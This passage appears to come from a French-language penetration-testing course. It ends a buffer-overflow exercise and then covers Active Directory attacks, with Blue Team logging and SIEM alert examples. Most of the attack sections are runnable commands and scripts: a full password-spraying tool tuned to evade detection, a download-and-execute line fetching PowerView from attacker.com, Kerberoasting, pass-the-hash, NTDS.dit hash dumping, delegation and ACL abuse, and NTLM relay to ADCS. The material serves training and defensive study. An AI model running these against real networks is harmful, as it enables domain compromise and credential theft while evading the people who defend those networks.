# Exécution de l'exploit dans GDB pour analyse
gdb -q ./vulnerable
gef> break *vulnerable_function
gef> run $(python3 exploit.py)

# Après le breakpoint, examiner la pile
gef> x/64wx $esp

# Continuer l'exécution jusqu'au JMP ESP
gef> break *0x08049000  # Adresse de JMP ESP
gef> continue

# Examiner les registres et la pile
gef> info registers
gef> x/32i $esp  # Voir les instructions du shellcode
```

10. **Nettoyage**

```bash
# Réactivation d'ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

#### Vue Blue Team

Dans un environnement réel, cette exploitation générerait des traces détectables :

1. **Logs générés**
   - Crashs d'application avec des erreurs de segmentation
   - Entrées anormalement longues dans les logs d'accès
   - Exécution de code dans des zones mémoire non autorisées

2. **Alertes potentielles**
   - Détection de buffer overflow par les solutions de sécurité
   - Alertes sur l'exécution de shellcode
   - Détection de comportement anormal de processus

3. **Contre-mesures possibles**
   - Activation des protections mémoire (ASLR, DEP/NX, canaries de pile)
   - Utilisation de compilateurs avec protections intégrées
   - Analyse statique et dynamique du code pour détecter les vulnérabilités

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir exploité avec succès un buffer overflow pour obtenir un shell
- Comprendre les étapes clés de l'exploitation (fuzzing, détermination de l'offset, recherche de gadgets, génération de shellcode)
- Apprécier l'importance des protections mémoire modernes
- Comprendre les traces générées par les exploitations de buffer overflow et comment les minimiser
# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 12 : Active Directory - Attaques fondamentales

### Introduction : Pourquoi ce thème est important

L'Active Directory (AD) est le service d'annuaire le plus répandu dans les environnements d'entreprise, gérant l'authentification et l'autorisation pour la majorité des organisations. Comprendre comment attaquer et défendre l'AD est donc essentiel pour tout pentester avancé. Ce chapitre couvre les techniques fondamentales d'attaque contre l'AD, depuis la reconnaissance initiale jusqu'à l'élévation de privilèges et le mouvement latéral. Ces compétences sont cruciales pour les tests d'intrusion réalistes et les évaluations de sécurité en entreprise. En intégrant les principes d'OPSEC de niveau 2, nous verrons également comment réaliser ces attaques de manière discrète pour éviter la détection par les équipes de sécurité.

### Principes fondamentaux de l'Active Directory

#### Architecture et composants clés

1. **Domaines et forêts**
   - Un domaine est une unité administrative regroupant des utilisateurs, ordinateurs et autres objets
   - Une forêt est un ensemble de domaines partageant un schéma commun et des relations d'approbation
   - Les contrôleurs de domaine (DC) hébergent une copie de l'annuaire et authentifient les utilisateurs

2. **Objets Active Directory**
   - Utilisateurs : comptes pour les personnes physiques
   - Groupes : collections d'utilisateurs pour faciliter l'attribution de droits
   - Ordinateurs : machines membres du domaine
   - Unités d'organisation (OU) : conteneurs pour organiser les objets
   - Stratégies de groupe (GPO) : paramètres appliqués aux utilisateurs et ordinateurs

3. **Protocoles d'authentification**
   - Kerberos : protocole principal d'authentification dans les domaines modernes
   - NTLM : protocole d'authentification plus ancien, toujours utilisé dans certains contextes
   - LDAP : protocole utilisé pour interroger et modifier l'annuaire

4. **Relations d'approbation**
   - Unidirectionnelles : le domaine A fait confiance au domaine B, mais pas l'inverse
   - Bidirectionnelles : les domaines A et B se font mutuellement confiance
   - Transitives : si A fait confiance à B et B fait confiance à C, alors A fait confiance à C
   - Non transitives : les relations de confiance ne se propagent pas

### Reconnaissance Active Directory

#### Énumération sans authentification

1. **Découverte de domaine**
   ```bash
   # Découverte du nom de domaine via DNS
   nslookup -type=srv _ldap._tcp.dc._msd.example.com
   
   # Découverte via NetBIOS
   nbtscan 192.168.1.0/24
   
   # Découverte via LDAP
   ldapsearch -x -h 192.168.1.10 -s base namingcontexts
   ```

2. **Énumération des contrôleurs de domaine**
   ```bash
   # Via DNS
   nslookup -type=srv _ldap._tcp.dc._msd.example.com
   
   # Via SMB
   crackmapexec smb 192.168.1.0/24 --pass-pol
   
   # Via LDAP
   ldapsearch -x -h 192.168.1.10 -s base "objectclass=*" | grep -i domaincontroller
   ```

3. **Énumération des utilisateurs sans authentification**
   ```bash
   # Via RPC null session
   rpcclient -U "" -N 192.168.1.10
   rpcclient $> enumdomusers
   
   # Via LDAP anonyme (si autorisé)
   ldapsearch -x -h 192.168.1.10 -b "DC=example,DC=com" "(objectClass=user)" sAMAccountName
   
   # Via Kerberos (user enumeration)
   kerbrute userenum -d example.com --dc 192.168.1.10 userlist.txt
   ```

4. **Énumération des partages SMB**
   ```bash
   # Énumération des partages accessibles sans authentification
   smbclient -L //192.168.1.10 -N
   
   # Avec CrackMapExec
   crackmapexec smb 192.168.1.0/24 --shares
   ```

#### Énumération avec authentification

1. **Énumération complète avec des identifiants valides**
   ```bash
   # Énumération avec BloodHound
   # Collecte de données avec SharpHound
   ./SharpHound.exe -c All
   
   # Ou avec bloodhound-python
   bloodhound-python -d example.com -u user -p password -c All -ns 192.168.1.10
   
   # Analyse des données avec BloodHound
   # Importer les fichiers ZIP générés dans l'interface BloodHound
   ```

2. **Énumération des utilisateurs et groupes**
   ```bash
   # Via PowerView (PowerShell)
   Import-Module .\PowerView.ps1
   Get-DomainUser
   Get-DomainGroup
   Get-DomainGroupMember -Identity "Domain Admins"
   
   # Via ldapsearch
   ldapsearch -x -h 192.168.1.10 -D "user@example.com" -w "password" -b "DC=example,DC=com" "(objectClass=user)" sAMAccountName userPrincipalName memberOf
   
   # Via CrackMapExec
   crackmapexec ldap 192.168.1.10 -u user -p password --users
   crackmapexec ldap 192.168.1.10 -u user -p password --groups
   ```

3. **Énumération des stratégies de groupe (GPO)**
   ```bash
   # Via PowerView
   Get-DomainGPO
   Get-GPPermission -Name "Default Domain Policy" -All
   
   # Via ldapsearch
   ldapsearch -x -h 192.168.1.10 -D "user@example.com" -w "password" -b "DC=example,DC=com" "(objectCategory=groupPolicyContainer)"
   ```

4. **Énumération des relations d'approbation**
   ```bash
   # Via PowerView
   Get-DomainTrust
   
   # Via nltest
   nltest /domain_trusts /all_trusts
   
   # Via ldapsearch
   ldapsearch -x -h 192.168.1.10 -D "user@example.com" -w "password" -b "DC=example,DC=com" "(objectClass=trustedDomain)"
   ```

#### Outils d'énumération automatisée

1. **BloodHound**
   ```bash
   # Installation de BloodHound
   apt install bloodhound
   
   # Démarrage de Neo4j
   sudo neo4j console
   
   # Démarrage de BloodHound
   bloodhound
   
   # Collecte de données avec SharpHound
   # Sur une machine Windows du domaine
   Import-Module .\SharpHound.ps1
   Invoke-BloodHound -CollectionMethod All
   
   # Ou avec bloodhound-python
   bloodhound-python -d example.com -u user -p password -c All -ns 192.168.1.10
   ```

2. **CrackMapExec**
   ```bash
   # Installation
   pip3 install crackmapexec
   
   # Énumération complète
   crackmapexec smb 192.168.1.0/24 -u user -p password --users --groups --local-groups --loggedon-users --sessions --disks --shares --pass-pol
   
   # Énumération LDAP
   crackmapexec ldap 192.168.1.10 -u user -p password --trusted-for-delegation --password-not-required --admin-count
   ```

3. **PowerView**
   ```powershell
   # Téléchargement et importation
   IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')
   
   # Énumération complète
   Get-DomainComputer -Properties DnsHostName,OperatingSystem,LastLogonDate
   Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
   Find-DomainShare -CheckShareAccess
   Get-DomainGPOLocalGroup
   ```

4. **ADRecon**
   ```powershell
   # Téléchargement et exécution
   .\ADRecon.ps1 -DomainController 192.168.1.10 -Credential (Get-Credential)
   
   # Génération d'un rapport Excel
   .\ADRecon.ps1 -OutputType Excel
   ```

### Attaques d'authentification

#### Attaques par pulvérisation de mot de passe (Password Spraying)

1. **Principes et avantages**
   - Tester un petit nombre de mots de passe courants contre de nombreux comptes
   - Évite le verrouillage de compte (contrairement au brute force)
   - Efficace contre les politiques de mot de passe faibles

2. **Identification de la politique de verrouillage**
   ```bash
   # Via CrackMapExec
   crackmapexec smb 192.168.1.10 --pass-pol
   
   # Via ldapsearch
   ldapsearch -x -h 192.168.1.10 -D "user@example.com" -w "password" -b "DC=example,DC=com" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration
   
   # Via PowerView
   Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
   ```

3. **Exécution de l'attaque**
   ```bash
   # Avec CrackMapExec
   crackmapexec smb 192.168.1.10 -u users.txt -p "Spring2023!" --continue-on-success
   
   # Avec Kerbrute
   kerbrute passwordspray -d example.com --dc 192.168.1.10 users.txt "Spring2023!"
   
   # Avec Metasploit
   use auxiliary/scanner/smb/smb_login
   set RHOSTS 192.168.1.10
   set SMBDomain EXAMPLE
   set USER_FILE users.txt
   set PASS_FILE passwords.txt
   set BRUTEFORCE_SPEED 5
   run
   ```

4. **Script de pulvérisation de mot de passe OPSEC**
   ```python
   #!/usr/bin/env python3
   import argparse
   import time
   import random
   import logging
   from impacket.smbconnection import SMBConnection
   from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
   
   def setup_logger():
       logger = logging.getLogger('password_spray')
       logger.setLevel(logging.INFO)
       handler = logging.FileHandler('password_spray.log')
       formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
       handler.setFormatter(formatter)
       logger.addHandler(handler)
       console = logging.StreamHandler()
       console.setFormatter(formatter)
       logger.addHandler(console)
       return logger
   
   def test_login(username, password, domain, target, logger):
       try:
           smbClient = SMBConnection(target, target)
           smbClient.login(username, password, domain)
           logger.info(f"[+] Success: {domain}\\{username}:{password}")
           return True
       except Exception as e:
           if "STATUS_LOGON_FAILURE" in str(e):
               logger.debug(f"[-] Failed: {domain}\\{username}:{password}")
           elif "STATUS_ACCOUNT_LOCKED_OUT" in str(e):
               logger.warning(f"[!] Account locked: {domain}\\{username}")
           else:
               logger.error(f"[!] Error: {domain}\\{username} - {str(e)}")
           return False
   
   def password_spray(users_file, password, domain, target, delay_min, delay_max, jitter, logger):
       logger.info(f"Starting password spray against {domain} on {target}")
       logger.info(f"Using password: {password}")
       logger.info(f"Delay range: {delay_min}-{delay_max} seconds with {jitter}% jitter")
       
       successful_users = []
       
       with open(users_file, 'r') as f:
           users = [line.strip() for line in f if line.strip()]
       
       logger.info(f"Loaded {len(users)} users from {users_file}")
       
       for i, username in enumerate(users):
           # Add jitter to delay
           base_delay = random.uniform(delay_min, delay_max)
           jitter_factor = 1 + (random.uniform(-jitter, jitter) / 100)
           actual_delay = base_delay * jitter_factor
           
           logger.info(f"Testing user {i+1}/{len(users)}: {username} (waiting {actual_delay:.2f}s before next attempt)")
           
           if test_login(username, password, domain, target, logger):
               successful_users.append(username)
           
           if i < len(users) - 1:  # Don't sleep after the last user
               time.sleep(actual_delay)
       
       logger.info(f"Password spray complete. {len(successful_users)}/{len(users)} successful logins.")
       if successful_users:
           logger.info("Successful users:")
           for user in successful_users:
               logger.info(f"  {domain}\\{user}:{password}")
       
       return successful_users
   
   if __name__ == "__main__":
       parser = argparse.ArgumentParser(description="OPSEC-aware Active Directory Password Spraying Tool")
       parser.add_argument("-u", "--users", required=True, help="File containing usernames")
       parser.add_argument("-p", "--password", required=True, help="Password to spray")
       parser.add_argument("-d", "--domain", required=True, help="Domain name")
       parser.add_argument("-t", "--target", required=True, help="Target domain controller")
       parser.add_argument("--min-delay", type=float, default=30.0, help="Minimum delay between attempts in seconds")
       parser.add_argument("--max-delay", type=float, default=60.0, help="Maximum delay between attempts in seconds")
       parser.add_argument("--jitter", type=float, default=20.0, help="Jitter percentage for randomizing delays")
       args = parser.parse_args()
       
       logger = setup_logger()
       
       password_spray(
           args.users,
           args.password,
           args.domain,
           args.target,
           args.min_delay,
           args.max_delay,
           args.jitter,
           logger
       )
   ```

#### Attaques par force brute ciblée

1. **Comptes à cibler**
   - Comptes de service (souvent avec des mots de passe statiques)
   - Comptes par défaut (krbtgt, Administrator, Guest)
   - Comptes avec des politiques de mot de passe spéciales

2. **Outils et techniques**
   ```bash
   # Avec Hydra
   hydra -l administrator -P wordlist.txt 192.168.1.10 smb
   
   # Avec CrackMapExec
   crackmapexec smb 192.168.1.10 -u administrator -p wordlist.txt
   
   # Avec Metasploit
   use auxiliary/scanner/smb/smb_login
   set RHOSTS 192.168.1.10
   set SMBDomain EXAMPLE
   set SMBUser administrator
   set PASS_FILE wordlist.txt
   run
   ```

3. **Génération de wordlists ciblées**
   ```bash
   # Création d'une wordlist basée sur l'entreprise
   cewl -d 2 -m 5 -w wordlist.txt https://example.com
   
   # Mutation de mots de passe avec hashcat
   hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated_wordlist.txt
   
   # Génération de variations saisonnières
   echo "Spring2023!" >> wordlist.txt
   echo "Summer2023!" >> wordlist.txt
   echo "Fall2023!" >> wordlist.txt
   echo "Winter2023!" >> wordlist.txt
   echo "Company2023!" >> wordlist.txt
   ```

#### Attaques Kerberos

1. **AS-REP Roasting**
   - Cible les comptes dont l'option "Ne pas exiger de pré-authentification Kerberos" est activée
   - Permet d'obtenir des hachages Kerberos AS-REP pouvant être crackés hors ligne
   
   ```bash
   # Avec Impacket
   GetNPUsers.py example.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt
   
   # Avec Rubeus
   Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
   
   # Craquage des hachages avec Hashcat
   hashcat -m 18200 hashes.txt wordlist.txt
   ```

2. **Kerberoasting**
   - Cible les comptes de service avec SPN (Service Principal Name)
   - Permet d'obtenir des tickets TGS pouvant être crackés hors ligne
   
   ```bash
   # Avec Impacket
   GetUserSPNs.py example.com/user:password -outputfile kerberoast-hashes.txt
   
   # Avec Rubeus
   Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast-hashes.txt
   
   # Avec PowerView
   Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv -NoTypeInformation kerberoast.csv
   
   # Craquage des hachages avec Hashcat
   hashcat -m 13100 kerberoast-hashes.txt wordlist.txt
   ```

3. **Pass-the-Ticket**
   - Utilisation d'un ticket Kerberos volé pour s'authentifier
   - Ne nécessite pas de connaître le mot de passe
   
   ```bash
   # Extraction de tickets avec Mimikatz
   mimikatz # sekurlsa::tickets /export
   
   # Injection de ticket avec Mimikatz
   mimikatz # kerberos::ptt ticket.kirbi
   
   # Avec Rubeus
   Rubeus.exe dump /service:krbtgt
   Rubeus.exe ptt /ticket:ticket.kirbi
   
   # Avec Impacket
   ticketer.py -nthash <hash> -domain-sid <sid> -domain example.com -spn cifs/server.example.com username
   export KRB5CCNAME=username.ccache
   psexec.py -k -no-pass example.com/username@server.example.com
   ```

### Mouvement latéral

#### Techniques de base

1. **Pass-the-Hash (PtH)**
   - Utilisation d'un hachage NTLM pour s'authentifier sans connaître le mot de passe en clair
   - Fonctionne avec l'authentification NTLM
   
   ```bash
   # Avec CrackMapExec
   crackmapexec smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
   
   # Avec Impacket
   psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 example.com/administrator@192.168.1.10
   
   # Avec Mimikatz
   mimikatz # sekurlsa::pth /user:administrator /domain:example.com /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
   ```

2. **Pass-the-Ticket (PtT)**
   - Utilisation d'un ticket Kerberos volé pour s'authentifier
   - Voir la section précédente sur les attaques Kerberos

3. **Overpass-the-Hash**
   - Conversion d'un hachage NTLM en ticket Kerberos
   - Combine les avantages de PtH et PtT
   
   ```bash
   # Avec Mimikatz
   mimikatz # sekurlsa::pth /user:administrator /domain:example.com /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe
   
   # Dans la nouvelle fenêtre PowerShell
   PS> klist purge
   PS> net use \\server.example.com\admin$
   
   # Avec Rubeus
   Rubeus.exe asktgt /domain:example.com /user:administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
   ```

4. **WMI et PowerShell Remoting**
   - Exécution de commandes à distance via WMI ou PowerShell
   - Nécessite des identifiants valides ou un ticket
   
   ```powershell
   # WMI
   wmic /node:192.168.1.10 /user:example\administrator /password:Password123 process call create "cmd.exe /c whoami > C:\temp\wmi.txt"
   
   # PowerShell Remoting
   $cred = Get-Credential
   Invoke-Command -ComputerName server.example.com -Credential $cred -ScriptBlock { whoami }
   
   # Avec CrackMapExec
   crackmapexec wmi 192.168.1.10 -u administrator -p Password123 -x "whoami"
   crackmapexec winrm 192.168.1.10 -u administrator -p Password123 -x "whoami"
   ```

#### Techniques avancées

1. **DCOM (Distributed Component Object Model)**
   - Exécution de code via des objets COM distants
   - Moins surveillé que WMI ou PowerShell Remoting
   
   ```powershell
   # Exemple avec MMC20.Application
   $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.10"))
   $dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
   
   # Exemple avec Excel.Application
   $excel = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.1.10"))
   $excel.DisplayAlerts = $false
   $excel.DDEInitiate("cmd", "/c calc.exe")
   ```

2. **SCM (Service Control Manager)**
   - Création et manipulation de services Windows à distance
   - Nécessite des privilèges élevés
   
   ```powershell
   # Création d'un service distant
   sc \\192.168.1.10 create TestService binPath= "cmd.exe /c net user hacker Password123 /add"
   sc \\192.168.1.10 start TestService
   sc \\192.168.1.10 delete TestService
   
   # Avec PowerShell
   $service = New-Object System.ServiceProcess.ServiceController("TestService", "192.168.1.10")
   $service.Start()
   $service.Stop()
   $service.Delete()
   ```

3. **DPAPI (Data Protection API)**
   - Extraction de secrets protégés par DPAPI
   - Accès aux mots de passe stockés dans les navigateurs, les identifiants Windows, etc.
   
   ```bash
   # Avec Mimikatz
   mimikatz # sekurlsa::dpapi
   
   # Extraction des clés maîtresses
   mimikatz # dpapi::masterkey /in:"C:\Users\username\AppData\Roaming\Microsoft\Protect\S-1-5-21-xxx\masterkey" /sid:S-1-5-21-xxx /password:Password123
   
   # Déchiffrement des blobs
   mimikatz # dpapi::blob /in:"C:\path\to\blob.bin" /masterkey:key_extracted_above
   ```

4. **Shadow Copies**
   - Création de copies instantanées de volumes pour extraire des fichiers verrouillés
   - Accès à NTDS.dit sans arrêter le service Active Directory
   
   ```powershell
   # Création d'une shadow copy
   wmic /node:192.168.1.10 /user:example\administrator /password:Password123 process call create "cmd.exe /c vssadmin create shadow /for=C:"
   
   # Copie de NTDS.dit depuis la shadow copy
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive
   
   # Extraction des hachages avec Impacket
   secretsdump.py -ntds ntds.dit -system system.hive LOCAL
   ```

### Élévation de privilèges dans le domaine

#### Abus des délégations

1. **Délégation contrainte (Constrained Delegation)**
   - Permet à un service de s'authentifier auprès d'autres services spécifiques au nom d'un utilisateur
   - Peut être abusée pour obtenir des tickets pour les services autorisés
   
   ```bash
   # Identification des comptes avec délégation contrainte
   Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
   
   # Avec BloodHound
   MATCH (c:Computer {constrained_delegation:true}) RETURN c
   
   # Exploitation avec Rubeus
   Rubeus.exe s4u /user:webservice /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /impersonateuser:administrator /msdsspn:cifs/server.example.com /ptt
   
   # Avec Impacket
   getST.py -spn cifs/server.example.com example.com/webservice:Password123 -impersonate administrator
   ```

2. **Délégation non contrainte (Unconstrained Delegation)**
   - Permet à un service de s'authentifier auprès de n'importe quel service au nom d'un utilisateur
   - Stocke les tickets TGT des utilisateurs qui s'y connectent
   
   ```bash
   # Identification des serveurs avec délégation non contrainte
   Get-DomainComputer -Unconstrained | Select-Object dnshostname
   
   # Avec BloodHound
   MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
   
   # Extraction des tickets avec Mimikatz
   mimikatz # sekurlsa::tickets /export
   
   # Avec Rubeus
   Rubeus.exe monitor /interval:5
   ```

3. **Délégation basée sur les ressources (Resource-Based Constrained Delegation)**
   - Configuration de délégation stockée sur l'objet ressource plutôt que sur le compte de service
   - Peut être abusée si on a le contrôle de l'objet cible
   
   ```powershell
   # Vérification des permissions
   Get-DomainComputer -Identity targetcomputer | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
   
   # Configuration de la délégation
   $sid = Get-DomainComputer -Identity attackercomputer | Select-Object -ExpandProperty objectsid
   $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
   $sdbytes = New-Object byte[] ($sd.BinaryLength)
   $sd.GetBinaryForm($sdbytes, 0)
   Get-DomainComputer targetcomputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdbytes}
   
   # Exploitation avec Rubeus
   Rubeus.exe hash /password:AttackerComputerPassword
   Rubeus.exe s4u /user:attackercomputer$ /rc4:hash_from_above /impersonateuser:administrator /msdsspn:cifs/targetcomputer.example.com /ptt
   ```

#### Abus des ACL

1. **Identification des ACL vulnérables**
   ```powershell
   # Avec PowerView
   Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "username"}
   
   # Recherche de droits GenericAll, GenericWrite, WriteOwner, WriteDACL, etc.
   Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL"}
   ```

2. **Abus des droits WriteDACL**
   ```powershell
   # Ajout d'un ACE pour donner le contrôle total à un utilisateur
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "username" -Rights All
   
   # Ajout d'un utilisateur au groupe Domain Admins
   Add-DomainGroupMember -Identity "Domain Admins" -Members "username"
   ```

3. **Abus des droits GenericWrite**
   ```powershell
   # Modification du script de connexion d'un utilisateur
   Set-DomainObject -Identity targetuser -Set @{scriptpath="\\attacker\malicious.ps1"}
   
   # Modification du SPN pour Kerberoasting
   Set-DomainObject -Identity targetuser -Set @{serviceprincipalname="fake/service"}
   ```

4. **Abus des droits WriteOwner**
   ```powershell
   # Changement du propriétaire d'un objet
   Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "username"
   
   # Après avoir changé le propriétaire, modification des ACL
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "username" -Rights All
   ```

#### Attaques de relais NTLM

1. **Relais SMB vers LDAP/LDAPS**
   ```bash
   # Configuration de Responder pour ne pas interférer avec ntlmrelayx
   sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
   sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
   
   # Lancement de ntlmrelayx
   ntlmrelayx.py -t ldaps://192.168.1.10 --escalate-user username
   
   # Déclenchement de l'authentification
   # Sur une machine Windows, forcer une connexion SMB vers l'attaquant
   dir \\attacker\share
   ```

2. **Relais avec mitm6 (IPv6)**
   ```bash
   # Installation de mitm6
   pip install mitm6
   
   # Lancement de mitm6
   mitm6 -d example.com
   
   # Lancement de ntlmrelayx
   ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh fakewpad.example.com -l loot
   ```

3. **Relais avec PetitPotam**
   ```bash
   # Utilisation de PetitPotam pour forcer l'authentification d'un DC
   PetitPotam.py attacker 192.168.1.10
   
   # Ou avec Impacket
   python3 petitpotam.py -d example.com -u username -p password attacker 192.168.1.10
   
   # Combinaison avec ntlmrelayx pour relayer vers ADCS
   ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs
   ```

#### Attaques via ADCS (Active Directory Certificate Services)

1. **ESC1 - Inscription de certificat avec authentification NTLM**
   ```bash
   # Identification des modèles de certificat vulnérables
   Certify.exe find /vulnerable
   
   # Exploitation avec ntlmrelayx
   ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs
   
   # Déclenchement de l'authentification avec PetitPotam
   PetitPotam.py attacker 192.168.1.10
   
   # Utilisation du certificat pour demander un TGT
   Rubeus.exe asktgt /user:administrator /certificate:base64certificate /ptt
   ```

2. **ESC8 - Vulnérabilité NTLM Relay dans l'interface Web ADCS**
   ```bash
   # Identification des serveurs CA
   Certify.exe cas
   
   # Exploitation avec ntlmrelayx
   ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs
   
   # Déclenchement de l'authentification
   # Forcer une connexion SMB vers l'attaquant
   dir \\attacker\share
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par la reconnaissance

1. **Logs d'authentification**
   - Tentatives d'authentification multiples depuis une même source
   - Authentifications avec des comptes différents
   - Échecs d'authentification suivis de succès (password spraying)
   
   **Exemple de log d'authentification :**
   ```
   Event ID: 4625 (Échec d'authentification)
   Account Name: user1
   Source Network Address: 192.168.1.100
   Logon Type: 3
   
   Event ID: 4624 (Authentification réussie)
   Account Name: user2
   Source Network Address: 192.168.1.100
   Logon Type: 3
   ```

2. **Logs LDAP**
   - Requêtes LDAP massives
   - Énumération d'objets sensibles
   - Connexions anonymes ou avec des comptes à faibles privilèges
   
   **Exemple de log LDAP :**
   ```
   Event ID: 1644 (LDAP Query)
   Client: 192.168.1.100
   Filter: (objectClass=user)
   Attributes: sAMAccountName,memberOf,userAccountControl
   ```

3. **Logs SMB**
   - Énumération de partages
   - Tentatives d'accès à des ressources partagées
   - Connexions null session
   
   **Exemple de log SMB :**
   ```
   Event ID: 5140 (Accès à un partage réseau)
   Share Name: \\*\IPC$
   Source Address: 192.168.1.100
   Account Name: ANONYMOUS LOGON
   ```

#### Traces générées par les attaques d'authentification

1. **Logs de pulvérisation de mot de passe**
   - Multiples échecs d'authentification pour différents comptes
   - Pattern régulier de tentatives
   - Même mot de passe utilisé pour plusieurs comptes
   
   **Exemple de log :**
   ```
   Event ID: 4771 (Échec de pré-authentification Kerberos)
   Account Name: user1
   Client Address: 192.168.1.100
   
   Event ID: 4771 (Échec de pré-authentification Kerberos)
   Account Name: user2
   Client Address: 192.168.1.100
   ```

2. **Logs d'attaques Kerberos**
   - Demandes de tickets TGS pour des comptes de service
   - Demandes AS-REP pour des comptes sans pré-authentification
   - Utilisation de tickets forgés ou volés
   
   **Exemple de log :**
   ```
   Event ID: 4769 (Ticket Kerberos demandé)
   Account Name: serviceaccount
   Service Name: SPN/hostname
   Client Address: 192.168.1.100
   
   Event ID: 4768 (Ticket TGT demandé)
   Account Name: user
   Client Address: 192.168.1.100
   ```

3. **Logs de Pass-the-Hash**
   - Authentifications NTLM sans tentative Kerberos préalable
   - Authentifications depuis des sources inhabituelles
   - Utilisation d'outils comme Mimikatz ou Impacket
   
   **Exemple de log :**
   ```
   Event ID: 4624 (Authentification réussie)
   Account Name: administrator
   Logon Type: 3
   Authentication Package: NTLM
   Source Network Address: 192.168.1.100
   ```

#### Traces générées par le mouvement latéral

1. **Logs d'exécution à distance**
   - Création de services à distance
   - Exécution de commandes via WMI, PowerShell Remoting, DCOM
   - Connexions administratives entre machines
   
   **Exemple de log :**
   ```
   Event ID: 7045 (Service installé)
   Service Name: TestService
   Service File Name: C:\Windows\System32\cmd.exe /c net user hacker Password123 /add
   
   Event ID: 4688 (Processus créé)
   Process Name: C:\Windows\System32\wsmprovhost.exe
   Creator Process ID: 1234
   ```

2. **Logs de délégation**
   - Utilisation de tickets S4U2Self et S4U2Proxy
   - Impersonation d'utilisateurs privilégiés
   - Accès à des services avec des tickets délégués
   
   **Exemple de log :**
   ```
   Event ID: 4769 (Ticket Kerberos demandé)
   Account Name: administrator
   Service Name: cifs/server.example.com
   Client Address: 192.168.1.100
   Additional Information: S4U2Proxy
   ```

3. **Logs de modification d'objets AD**
   - Modifications d'ACL
   - Ajouts de membres à des groupes privilégiés
   - Modifications d'attributs sensibles
   
   **Exemple de log :**
   ```
   Event ID: 5136 (Modification d'objet AD)
   Object DN: CN=Domain Admins,CN=Users,DC=example,DC=com
   Attribute: member
   Operation Type: Value Added
   ```

#### Alertes SIEM typiques

**Alerte de pulvérisation de mot de passe :**
```
[ALERT] Password Spray Attack Detected
Source IP: 192.168.1.100
Time: 2023-05-15 14:23:45
Details: Multiple failed authentication attempts for different accounts from the same source
Affected Accounts: user1, user2, user3, ...
Severity: High
```

**Alerte de Kerberoasting :**
```
[ALERT] Kerberoasting Attack Detected
Source IP: 192.168.1.100
Account: user
Time: 2023-05-15 14:30:12
Details: Multiple TGS requests for service accounts in short time period
Affected Services: SPN1, SPN2, SPN3, ...
Severity: Medium
```

**Alerte de mouvement latéral :**
```
[ALERT] Lateral Movement Detected
Source Host: workstation01
Target Host: server01
Account: administrator
Time: 2023-05-15 14:35:27
Details: Remote command execution via WMI followed by suspicious process creation
Severity: High
```

### Pièges classiques et erreurs à éviter

#### Erreurs de reconnaissance

1. **Scans trop agressifs**
   - Énumération rapide de nombreux utilisateurs ou ressources
   - Requêtes LDAP massives
   - Scans de ports multiples
   
   **Solution :** Espacer les requêtes, limiter le nombre de cibles simultanées, utiliser des délais aléatoires entre les requêtes.

2. **Utilisation d'outils bruyants**
   - Outils générant beaucoup de trafic réseau
   - Scripts automatisés sans contrôle de débit
   - Outils connus et détectés par les solutions de sécurité
   
   **Solution :** Préférer des outils discrets, personnaliser les scripts pour limiter le bruit, utiliser des techniques manuelles quand c'est possible.

3. **Négligence des logs générés**
   - Ignorer les traces laissées par les activités de reconnaissance
   - Ne pas vérifier les politiques d'audit en place
   - Sous-estimer les capacités de détection
   
   **Solution :** Comprendre quelles actions génèrent des logs, adapter les techniques en fonction des politiques d'audit, privilégier les méthodes passives quand c'est possible.

#### Erreurs d'authentification

